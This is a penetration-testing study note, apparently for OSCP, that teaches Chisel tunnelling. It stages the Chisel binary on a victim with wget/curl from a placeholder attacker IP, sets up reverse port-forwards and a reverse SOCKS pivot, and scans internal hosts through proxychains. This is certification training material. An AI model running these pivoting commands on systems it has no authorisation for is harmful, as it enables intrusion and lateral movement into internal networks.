# Chisel — Port Forwarding & Tunneling (OSCP)

Fast TCP tunnel over HTTP(S). One Go binary is **both** the server and the client. Use it to reach a service that's only listening on the target's `127.0.0.1` (or to pivot into an internal subnet) from your Kali box.

> **Kali (attacker) side — apt-installed** → `/usr/bin/chisel`, so invoke it as **`chisel`** (it's on `$PATH` — **no `./`**). Install with `sudo apt install chisel` if a box doesn't have it. One Go binary is both server and client.
>
> **Target (victim) side — you must transfer a binary to it** (it never has chisel). See [[#Get chisel onto the target first]] below; run it there as `./chisel` from wherever you drop it.
>
> **Match version + arch on both ends** — a mismatch makes chisel *refuse* the tunnel. Easiest guarantee for a **linux_amd64** target: copy Kali's own `/usr/bin/chisel` over (don't download a separate release). For a **Windows** target grab `chisel_*_windows_amd64.gz` from https://github.com/jpillora/chisel/releases (`gunzip` → transfer as `chisel.exe`).

---

## Chisel vs Ligolo — which to reach for

| Need                                                                              | Tool                                       | Why                                                                    |
| --------------------------------------------------------------------------------- | ------------------------------------------ | ---------------------------------------------------------------------- |
| Forward **one or two** internal/loopback ports (e.g. Jenkins on `127.0.0.1:8080`) | **Chisel** reverse port-forward            | one line, no TUN, no proxychains                                       |
| Route an **entire internal subnet** transparently (multi-host pivot)              | **[[Ligolo]]**                             | TUN interface, every tool works natively                               |
| Route a whole subnet but Ligolo isn't available                                   | **Chisel** reverse **SOCKS** + proxychains | same reach as Ligolo, but every command must be prefixed `proxychains` |

> Ligolo routes subnets but **does not** cover the agent's `127.0.0.1` by default. For a single *loopback* service, chisel's reverse port-forward is the simpler tool — which is why walkthroughs reach for it there.

---

## Get chisel onto the target first


**linux_amd64 target — copy Kali's own binary** (guarantees the version matches):
```bash
# Kali — serve the binary from a working dir
cp /usr/bin/chisel .
python3 -m http.server 80
```
```bash
# Target — pull it and make it executable
wget http://<KALI_IP>/chisel -O /tmp/chisel && chmod +x /tmp/chisel
# no wget? →  curl http://<KALI_IP>/chisel -o /tmp/chisel && chmod +x /tmp/chisel
```
Then run the client from where you dropped it: `cd /tmp && ./chisel client …`.

> Other transfer routes (scp, SMB, `certutil`/PowerShell for Windows `chisel.exe`) are in [[File_Transfer]]. For a **Windows** target you need `chisel.exe` (windows_amd64), not Kali's linux binary.

---

## Reverse Port-Forward — expose ONE target-loopback port on Kali

The go-to for "there's a service on the target's `127.0.0.1:8080` I need to browse." **Reverse** = the target dials back to Kali, so it works even when you can't connect *into* the target (firewall/NAT).

**1. Kali — start the server (listener):**
```bash
cd ~/tools/chisel && ./chisel server --reverse --port 8081
```
→ `--reverse` lets clients request reverse tunnels; `--port 8081` is chisel's own control port (target connects here). Leave it running.

**2. Stage the binary onto the target** — chisel isn't on the target yet, and the `client` runs *there*. Serve it from Kali and pull it (full menu: [[File_Transfer]]):
```bash
# Kali — NEW terminal (keep the server running in the first one)
cd ~/tools/chisel && python3 -m http.server 8000
# Target
wget http://<KALI_IP>:8000/chisel -O /tmp/chisel && chmod +x /tmp/chisel
```
> You now have **two Kali listeners**: chisel control (**8081**) + temp file server (**8000**). `chmod +x` is required — wget drops the exec bit. If `./chisel` → `Permission denied`, `/tmp` is `noexec` → re-grab into `/dev/shm`. Already have SSH creds? `scp ~/tools/chisel/chisel user@<TARGET>:/tmp/` skips the file server entirely.

**3. Target — connect back and request the forward:**
```bash
/tmp/chisel client <KALI_IP>:8081 R:8082:127.0.0.1:8080
```
→ `R:8082:127.0.0.1:8080` = **R**everse: open **8082 on Kali**, forward to the target's **`127.0.0.1:8080`**. Read it as `R:<kali_port>:<dest_as_seen_from_target>`. Use your **current** tun0 IP for `<KALI_IP>` (`ip a show tun0`) — wrong IP = client hangs with no session.

**4. Kali — use it:** the internal service is now local — browse/curl/Burp it. The server terminal prints a session line when the target connects.
```
http://127.0.0.1:8082
```
*For enumerating Headers:*
```
  curl -v http://127.0.0.1:8082/
```

---

## Reverse SOCKS — the Ligolo-style "whole network" mode

When you need to reach a **range of internal hosts/ports** (not just one) and don't have Ligolo, run a reverse **SOCKS** proxy and send tools through it with proxychains.

**Kali — server (same as above):**
```bash
chisel server --reverse --port 8081
```

**Target — request a SOCKS tunnel instead of a fixed port:**
```bash
./chisel client <KALI_IP>:8081 R:1080:socks
```
→ opens a **SOCKS5 proxy on Kali `127.0.0.1:1080`** that egresses from the target.

**Kali — point proxychains at it** (`/etc/proxychains4.conf`, bottom):
```
socks5 127.0.0.1 1080
```
**Then prefix any tool:**
```bash
proxychains nmap -sT -Pn -p 80,443,8080 <internal_ip>
proxychains curl http://<internal_ip>:8080
```
> proxychains only tunnels **TCP** and needs `-sT` (connect scan) for nmap — SYN scans and ICMP won't traverse SOCKS. This is the trade-off vs Ligolo's TUN, where a normal `nmap`/ping just works.

---

## Forward Port-Forward (less common)

When *you* can already reach the chisel server on the target and want to pull a port toward you, drop `--reverse` and omit the `R:`:
```bash
# target
./chisel server --port 8081
# kali
chisel client <TARGET_IP>:8081 8082:127.0.0.1:8080
```
→ opens 8082 on Kali → target's `127.0.0.1:8080`. In OSCP the **reverse** form above is almost always the right one (target reaches back to you).

---

## Related Notes

- [[Ligolo]]
- [[File_Transfer]]
- [[Linux_Priv_Esc]]
